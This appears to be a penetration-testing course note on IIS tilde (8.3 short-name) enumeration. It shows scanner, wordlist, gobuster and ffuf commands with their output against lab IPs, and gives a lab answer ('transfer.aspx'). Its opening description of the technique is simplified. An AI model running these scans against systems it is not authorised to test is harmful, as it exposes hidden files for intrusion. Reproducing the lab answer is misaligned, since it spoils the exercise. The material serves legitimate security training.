# IIS Tilde Enumeration
IIS tilde directory enumeration is a technique utilised to uncover hidden files, directories, and short file names (aka the `8.3 format`) on some versions of Microsoft Internet Information Services (IIS) web servers.

When a file or folder is created on an IIS server, Windows generates a short file name in the `8.3 format`, consisting of eight characters for the file name, a period, and three characters for the extension. The tilde (`~`) character, followed by a sequence number, signifies a short file name in a URL. Hence, if someone determines a file or folder's short file name, they can exploit the tilde character and the short file name in the URL to access sensitive data or hidden resources.

Assume the server contains a hidden directory named `SecretDocuments`. When a request is sent to http://example.com/~s, the server replies with a `200 OK` status code, revealing a directory with a short name beginning with "`s`". The enumeration process continues by appending more characters:

```
http://example.com/~se
http://example.com/~sf
http://example.com/~sg
...
http://example.com/~sec
http://example.com/~sed
http://example.com/~see
...
```

Continuing this procedure, the short name `secret~1` is eventually discovered when the server returns a 200 OK status code for the request http://example.com/~secret. 

For instance, if the short name `secret~1` is determined for the concealed directory `SecretDocuments`, files in that directory can be accessed by submitting requests such as:

```
http://example.com/secret~1/somefile.txt
http://example.com/secret~1/anotherfile.docx
```

The same IIS tilde directory enumeration technique can also detect 8.3 short file names for files within the directory. After obtaining the short names, those files can be directly accessed using the short names in the requests.

```
http://example.com/secret~1/somefi~1.txt
```

In 8.3 short file names, such as `somefi~1.txt`, the number "`1`" is a unique identifier that distinguishes files with similar names within the same directory. For example, if two files named `somefile.txt` and `somefile1.txt` exist in the same directory, their 8.3 short file names would be:

- `somefi~1.txt` for `somefile.txt`
- `somefi~2.txt` for `somefile1.txt`

## Enumeration
### Tilde Enumeration using IIS ShortName Scanner
You can find it on GitHub at the following link: [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner). To use `IIS-ShortName-Scanner`, you will need to install Oracle Java on either Pwnbox or your local VM. Details can be found in the following link. [How to Install Oracle Java](https://ubuntuhandbook.org/index.php/2022/03/install-jdk-18-ubuntu/)

```shellsession
$ java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Do you want to use proxy [Y=Yes, Anything Else=No]? 
# IIS Short Name (8.3) Scanner version 2023.0 - scan initiated 2023/03/23 15:06:57
Target: http://10.129.204.231/
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): /~1/
|_ Extra information:
  |_ Number of sent requests: 553
  |_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
  |_ Identified files: 3
    |_ CSASPX~1.CS
      |_ Actual extension = .CS
    |_ CSASPX~1.CS??
    |_ TRANSF~1.ASP
```

Upon executing the tool, it discovers 2 directories and 3 files. However, the target does not permit GET access to http://10.129.204.231/TRANSF~1.ASP, necessitating the brute-forcing of the remaining filename.

### Generate Wordlist

```shellsession
$ egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' | sort -u > /tmp/list.txt
```

<table class="bg-neutral-800 text-primary w-full"><thead class="text-left rounded-t-lg"><tr class="border-t-neutral-600 first:border-t-0 border-t"><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4"><strong class="font-bold">Command Part</strong></th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4"><strong class="font-bold">Description</strong></th></tr></thead><tbody class="font-mono text-sm"><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">egrep -r ^transf</code></td><td class="p-4">The <code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">egrep</code> command is used to search for lines containing a specific pattern in the input files. The <code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">-r</code> flag indicates a recursive search through directories. The <code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">^transf</code> pattern matches any line that starts with "transf". The output of this command will be lines that begin with "transf" along with their source file names.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">|</code></td><td class="p-4">The pipe symbol (<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">|</code>) is used to pass the output of the first command (<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">egrep</code>) to the second command (<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">sed</code>). In this case, the lines starting with "transf" and their file names will be the input for the <code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">sed</code> command.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">sed 's/^[^:]*://'</code></td><td class="p-4">The <code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">sed</code> command is used to perform a find-and-replace operation on its input (in this case, the output of <code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">egrep</code>). The <code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">'s/^[^:]*://'</code> expression tells <code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">sed</code> to find any sequence of characters at the beginning of a line (<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">^</code>) up to the first colon (<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">:</code>), and replace them with nothing (effectively removing the matched text). The result will be the lines starting with "transf" but without the file names and colons.</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">&gt; /tmp/list.txt</code></td><td class="p-4">The greater-than symbol (<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">&gt;</code>) is used to redirect the output of the entire command (i.e., the modified lines) to a new file named <code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">/tmp/list.txt</code>.</td></tr></tbody></table>

### Gobuster Enumeration
Once you have created the custom wordlist, you can use `gobuster` to enumerate all items in the target.

```shellsession
$ gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp

===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.204.231/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /tmp/list.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              asp,aspx
[+] Timeout:                 10s
===============================================================
2023/03/23 15:14:05 Starting gobuster in directory enumeration mode
===============================================================
/transf**.aspx        (Status: 200) [Size: 941]
Progress: 306 / 309 (99.03%)
===============================================================
2023/03/23 15:14:11 Finished
===============================================================
```

## Questions
1. What is the full .aspx filename that Gobuster identified? **Answer: transfer.aspx**
   - Run the scanner against target, identified `TRANSF~1.ASP` but accessing it directly does not work:
      ```shellsession
      $ java -jar iis_shortname_scanner.jar 0 5 http://10.129.62.165/
      Do you want to use proxy [Y=Yes, Anything Else=No]? N
      Early result: the target is probably vulnerable.
      Early result: identified letters in names > A,C,D,E,F,L,N,O,P,R,S,T,U,X
      Early result: identified letters in extensions > A,C,P,S
      # IIS Short Name (8.3) Scanner version 2023.4 - scan initiated 2026/06/26 01:09:22
      Target: http://10.129.62.165/
      |_ Result: Vulnerable!
      |_ Used HTTP method: OPTIONS
      |_ Suffix (magic part): /~1/.rem
      |_ Extra information:
        |_ Number of sent requests: 571
        |_ Identified directories: 2
          |_ ASPNET~1
          |_ UPLOAD~1
        |_ Identified files: 2
          |_ CSASPX~1.CS
            |_ Actual extension = .CS
          |_ TRANSF~1.ASP
      ```
   - Create a wordlist starting with `transf` and use `ffuf` to bruteforce the file:
      ```shellsession
      $ egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' | sort -u > /tmp/list.txt
      $ ffuf -w /tmp/list.txt:FUZZ -u http://10.129.62.165/FUZZ.aspx

              /'___\  /'___\           /'___\       
            /\ \__/ /\ \__/  __  __  /\ \__/       
            \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
              \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
              \ \_\   \ \_\  \ \____/  \ \_\       
                \/_/    \/_/   \/___/    \/_/       

            v2.1.0-dev
      ________________________________________________

      :: Method           : GET
      :: URL              : http://10.129.62.165/FUZZ.aspx
      :: Wordlist         : FUZZ: /tmp/list.txt
      :: Follow redirects : false
      :: Calibration      : false
      :: Timeout          : 10
      :: Threads          : 40
      :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
      ________________________________________________

      transfer                [Status: 200, Size: 941, Words: 89, Lines: 22, Duration: 173ms]
      ```